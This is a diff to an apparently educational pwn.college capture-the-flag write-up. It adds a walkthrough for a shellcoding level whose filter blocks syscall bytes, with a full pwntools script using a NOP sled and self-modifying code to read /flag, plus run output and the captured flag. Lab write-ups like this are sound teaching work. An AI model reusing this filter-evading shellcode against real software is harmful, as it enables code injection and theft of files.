@@ -107,10 +107,10 @@ We can see that the program requires that our shell code has no `[REX.W prefix]`
 
 ```
 ## REX:
-0100WRXB
+0100 W R X B
 
-## REX.W
-0100 1000  = 0x48
+## REX.W:
+0100 1000   =>   0x48
 ```
 
 A `REX.W` prefix is used to denote when an instruction uses 64-bit operands.
@@ -309,7 +309,6 @@ flag:
     .string "/flag" 
 """
 
-process
 shellcode = asm(shellcode_asm)
 sys.stdout.buffer.write(shellcode)
 print(disasm(shellcode), file=sys.stderr)
@@ -401,3 +400,187 @@ Mapped 0x2000 bytes for shellcode at 0x2b033000!
 Reading 0x2000 bytes from stdin.
 ```
 
+If we try the exploit from the previous challenge, we get the following message:
+
+```
+hacker@program-security~syscall-shenanigans:/$ python ~/script.py | /challenge/syscall-shenanigans 
+###
+### Welcome to /challenge/syscall-shenanigans!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x2000 bytes for shellcode at 0x2b033000!
+Reading 0x2000 bytes from stdin.
+
+   0:   8d 3d 4f 00 00 00       lea    edi, [rip+0x4f]        # 0x55
+   6:   31 f6                   xor    esi, esi
+   8:   31 d2                   xor    edx, edx
+   a:   b8 02 00 00 00          mov    eax, 0x2
+   f:   fe 05 07 00 00 00       inc    BYTE PTR [rip+0x7]        # 0x1c
+  15:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x1b
+  1b:   0e                      (bad)  
+  1c:   04 bf                   add    al, 0xbf
+  1e:   01 00                   add    DWORD PTR [rax], eax
+  20:   00 00                   add    BYTE PTR [rax], al
+  22:   89 c6                   mov    esi, eax
+  24:   ba 00 00 00 00          mov    edx, 0x0
+  29:   49 c7 c2 00 01 00 00    mov    r10, 0x100
+  30:   b8 28 00 00 00          mov    eax, 0x28
+  35:   fe 05 07 00 00 00       inc    BYTE PTR [rip+0x7]        # 0x42
+  3b:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x41
+  41:   0e                      (bad)  
+  42:   04 31                   add    al, 0x31
+  44:   ff b0 3c fe 05 07       push   QWORD PTR [rax+0x705fe3c]
+  4a:   00 00                   add    BYTE PTR [rax], al
+  4c:   00 fe                   add    dh, bh
+  4e:   05 00 00 00 00          add    eax, 0x0
+  53:   0e                      (bad)  
+  54:   04 2f                   add    al, 0x2f
+  56:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
+  58:   61                      (bad)  
+  59:   67                      addr32
+        ...
+Executing filter...
+
+This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
+are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
+(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
+insert the `syscall` instructions at runtime.
+
+Removing write permissions from first 4096 bytes of shellcode.
+
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x000000002b033000 | 8d 3d 4f 00 00 00                             | lea edi, [rip + 0x4f]
+0x000000002b033006 | 31 f6                                         | xor esi, esi
+0x000000002b033008 | 31 d2                                         | xor edx, edx
+0x000000002b03300a | b8 02 00 00 00                                | mov eax, 2
+0x000000002b03300f | fe 05 07 00 00 00                             | inc byte ptr [rip + 7]
+0x000000002b033015 | fe 05 00 00 00 00                             | inc byte ptr [rip]
+
+Executing shellcode!
+
+Segmentation fault
+```
+
+Since the first 4096 bytes will be non-executable, we will have to pad that range with a NOP sled.
+
+### NOP sled
+
+#### `nop` instruction
+
+The `nop` instruction makes no semantic difference to the program, i.e. it does nothing to the program logic. For this reason, it can be used to pad the code.
+
+We can repeat the `nop` instruction using a `repeat` loop.
+
+#### `rept` instruction
+
+The `rept` instruction creates a loop repeats which whatever instruction is mentioned within it as many times as specified.
+
+```
+.rept (number of times to be repeated)
+instruction
+.endr
+```
+
+Now we simply have to put our `nop` instruction inside the repeat loop and put the repeat loop between the `jmp` instruction and the label.
+
+```
+jmp Relative
+.rept 4096
+nop
+.endr
+Relative:
+mov rax, 0x1
+```
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+shellcode_asm = """
+    /* NOP sled */
+    jmp Relative
+
+    .rept 4096
+    nop
+    .endr
+
+    Relative:
+
+    /* open("/flag", 0, 0) */
+    lea edi, [rip + flag]
+    xor esi, esi
+    xor edx, edx
+    mov eax, 0x02
+    
+    /* syscall */
+ 	inc byte ptr [rip + sys1 + 1]
+	inc byte ptr [rip + sys1]
+sys1:
+	.byte 0x0e
+	.byte 0x04        
+
+    /* sendfile(1, rax, 0, 0x100) */
+    mov edi, 1          
+    mov esi, eax
+    mov edx, 0
+    mov r10, 0x100
+    mov eax, 40          
+ 
+    /* syscall */
+ 	inc byte ptr [rip + sys2 + 1]
+	inc byte ptr [rip + sys2]
+sys2:
+	.byte 0x0e
+	.byte 0x04            
+
+    /* exit(0) */
+    xor edi, edi
+    mov al, 60
+
+    /* syscall */
+ 	inc byte ptr [rip + sys3 + 1]
+	inc byte ptr [rip + sys3]
+sys3:
+	.byte 0x0e
+	.byte 0x04           
+
+flag:
+    .string "/flag" 
+"""
+
+shellcode = asm(shellcode_asm)
+sys.stdout.buffer.write(shellcode)
+print(disasm(shellcode), file=sys.stderr)
+```
+
+```
+hacker@program-security~syscall-shenanigans:/$ python ~/script.py | /challenge/syscall-shenanigans 
+
+# --- snip ---
+
+0x000000002b034003 | 90                                            | nop 
+0x000000002b034004 | 90                                            | nop 
+0x000000002b034005 | 8d 3d 4f 00 00 00                             | lea edi, [rip + 0x4f]
+0x000000002b03400b | 31 f6                                         | xor esi, esi
+0x000000002b03400d | 31 d2                                         | xor edx, edx
+0x000000002b03400f | b8 02 00 00 00                                | mov eax, 2
+0x000000002b034014 | fe 05 07 00 00 00                             | inc byte ptr [rip + 7]
+0x000000002b03401a | fe 05 00 00 00 00                             | inc byte ptr [rip]
+
+Executing shellcode!
+
+pwn.college{ExWjiR3WDqi0KdvDkYToGHFiGhQ.0lMyIDL4ITM0EzW}
+```
